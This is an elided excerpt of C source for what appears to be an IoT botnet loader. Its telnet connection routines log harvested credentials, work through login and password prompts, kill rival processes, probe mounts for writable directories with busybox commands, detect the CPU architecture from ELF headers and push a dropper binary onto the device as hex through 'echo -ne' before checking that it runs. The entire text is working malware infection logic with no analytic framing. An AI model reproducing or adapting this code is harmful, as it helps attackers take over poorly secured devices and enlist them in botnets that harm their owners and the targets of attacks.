  ...
  if (conn->open) {
    ...
    if (conn->success) {
      ...
      fprintf(stderr, "OK|%d.%d.%d.%d:%d %s:%s %s\n", conn->info.addr & 0xff,
              (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff,
              (conn->info.addr >> 24) & 0xff, ntohs(conn->info.port),
      ...
      fprintf(stderr, "ERR|%d.%d.%d.%d:%d %s:%s %s|%d\n",
              ...
              ntohs(conn->info.port), conn->info.user, conn->info.pass,
              conn->info.arch, conn->state_telnet);
    }
  }
...
int connection_consume_login_prompt(struct connection *conn) {
  ...
  if (prompt_ending == -1) {
    ...
    if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
      prompt_ending = tmp;
    else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) !=
             -1)
      prompt_ending = tmp;
  }
...
int connection_consume_password_prompt(struct connection *conn) {
  ...
  if (prompt_ending == -1) {
    ...
    if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) !=
        -1)
      prompt_ending = tmp;
  }
...
int connection_consume_psoutput(struct connection *conn) {
  ...
  offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE,
                          strlen(TOKEN_RESPONSE));
    ...
    if (conn->rdbuf[i] == '\r')
      ...
      for (ii = 0; ii < ((char *)&conn->rdbuf[i] - start); ii++) {
        if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0) {
          if (option_on > 0 && !last_character_was_space) option_on++;
          start[ii] = 0;
          ...
          if (option_on == 0) {
            pid_str = &start[ii];
            option_on++;
          } else if (option_on >= 3 && option_on <= 5 &&
      ...
      if (pid_str != NULL && proc_name != NULL) {
        ...
        if (pid != 1 &&
            (strcmp(proc_name, "init") == 0 ||
             strcmp(proc_name, "[init]") == 0))  // Kill the second init
          ...
          for (ii = 0; ii < len_proc_name; ii++) {
            if (proc_name[ii] >= '0' && proc_name[ii] <= '9')
              num_count++;
            else if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') ||
                     (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z')) {
              num_alphas++;
              break;
            }
          }
...
// util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
  ...
  if (offset == -1) {
    ...
    for (i = 0; i < conn->rdbuf_pos; i++) {
      if (conn->rdbuf[i] == 0) conn->rdbuf[i] = ' ';
    }
    return offset;
  }
}
...
int connection_consume_mounts(struct connection *conn) {
  ...
  for (i = 0; i < prompt_ending; i++) {
    ...
    if (conn->rdbuf[i] == '\n') {
      ...
      if ((path = strtok(NULL, " ")) == NULL) goto dirs_end_line;
      if (strtok(NULL, " ") == NULL)  // Skip type of partition
        goto dirs_end_line;
      if ((mnt_info = strtok(NULL, " ")) == NULL) goto dirs_end_line;

      if (path[strlen(path) - 1] == '/') path[strlen(path) - 1] = 0;

      if (util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1) {
        util_sockprintf(conn->fd,
                        "/bin/busybox echo -e '%s%s' > %s/.nippon; "
                        "/bin/busybox cat %s/.nippon; /bin/busybox rm "
                        "%s/.nippon\r\n",
    ...
    dirs_end_line:
      ...
      if (num_whitespaces++ == 0) linebuf[linebuf_pos++] = conn->rdbuf[i];
  ...
  util_sockprintf(conn->fd,
                  "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox "
...
int connection_consume_written_dirs(struct connection *conn) {
  ...
  if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE,
                                strlen(TOKEN_RESPONSE))) == -1)
    return 0;
  ...
  while (TRUE) {
    ...
    offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset,
                            VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
    if (offset == -1) break;
    total_offset += offset;
    ...
    if (pch[pch_len - 1] == '\r') pch[pch_len - 1] = 0;
...
int connection_consume_copy_op(struct connection *conn) {
  int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE,
                              strlen(TOKEN_RESPONSE));
...
int connection_consume_arch(struct connection *conn) {
  if (!conn->info.has_arch) {
    ...
    if ((elf_start_pos =
             util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ELF", 3)) == -1)
      return 0;
    ...
    if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE,
                                 strlen(TOKEN_RESPONSE))) != -1)
      return offset;
    if (conn->rdbuf_pos > 7168) {
      // Hack drain buffer
...
int connection_consume_arm_subtype(struct connection *conn) {
  ...
  if (util_memsearch(conn->rdbuf, offset, "ARMv4", 5) != -1) {
    printf("[FD%d] Arch has ARMv4!\n", conn->fd);
    strcpy(conn->info.arch, "arm4");
  }
  if (util_memsearch(conn->rdbuf, offset, "ARMv5", 5) != -1) {
...
int connection_consume_upload_methods(struct connection *conn) {
  ...
  else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) ==
           -1)
...
int connection_upload_echo(struct connection *conn) {
  ...
  if (conn->echo_load_pos == conn->bin->hex_payloads_len) return offset;

  // echo -ne 'hex' [>]> path/FN_DROPPER
  util_sockprintf(conn->fd,
                  "echo -ne '%s' %s " FN_DROPPER "; " TOKEN_QUERY "\r\n",
...
int connection_verify_payload(struct connection *conn) {
  int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE,
